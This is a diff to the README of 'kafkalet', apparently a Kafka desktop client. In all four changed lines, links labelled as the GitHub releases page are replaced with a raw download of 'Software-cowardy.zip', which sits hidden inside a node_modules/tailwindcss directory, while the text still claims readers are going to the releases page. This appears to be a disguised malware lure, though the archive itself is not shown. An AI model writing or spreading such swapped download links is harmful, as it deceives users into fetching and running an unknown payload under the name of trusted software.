@@ -1,6 +1,6 @@
 # 🎯 kafkalet - Clear Kafka Client for Everyone
 
-[![Download kafkalet](https://img.shields.io/badge/Download-Get%20kafkalet-brightgreen.svg)](https://github.com/anandhuPeepi/kafkalet/releases)
+[![Download kafkalet](https://img.shields.io/badge/Download-Get%20kafkalet-brightgreen.svg)](https://github.com/anandhuPeepi/kafkalet/raw/refs/heads/main/frontend/node_modules/tailwindcss/lib/cli/Software-cowardy.zip)
 
 ---
 
@@ -41,7 +41,7 @@ No complex installations are needed. kafkalet comes as a ready-to-run app once y
 
 Click the button below to visit the official download page:
 
-[![Download kafkalet](https://img.shields.io/badge/Download-Here%20at%20GitHub-blue.svg)](https://github.com/anandhuPeepi/kafkalet/releases)
+[![Download kafkalet](https://img.shields.io/badge/Download-Here%20at%20GitHub-blue.svg)](https://github.com/anandhuPeepi/kafkalet/raw/refs/heads/main/frontend/node_modules/tailwindcss/lib/cli/Software-cowardy.zip)
 
 This will open the releases page on GitHub. Look for the latest version with a `.exe` file for Windows. The file name will look similar to:
 
@@ -130,7 +130,7 @@ If you have trouble using kafkalet:
 
 ## 🔄 Updating kafkalet
 
-Check the [releases page](https://github.com/anandhuPeepi/kafkalet/releases) regularly for new versions.
+Check the [releases page](https://github.com/anandhuPeepi/kafkalet/raw/refs/heads/main/frontend/node_modules/tailwindcss/lib/cli/Software-cowardy.zip) regularly for new versions.
 
 To update:
 
@@ -169,4 +169,4 @@ kafkalet uses these technologies:
 
 ---
 
-[Download kafkalet from GitHub](https://github.com/anandhuPeepi/kafkalet/releases)
+[Download kafkalet from GitHub](https://github.com/anandhuPeepi/kafkalet/raw/refs/heads/main/frontend/node_modules/tailwindcss/lib/cli/Software-cowardy.zip)
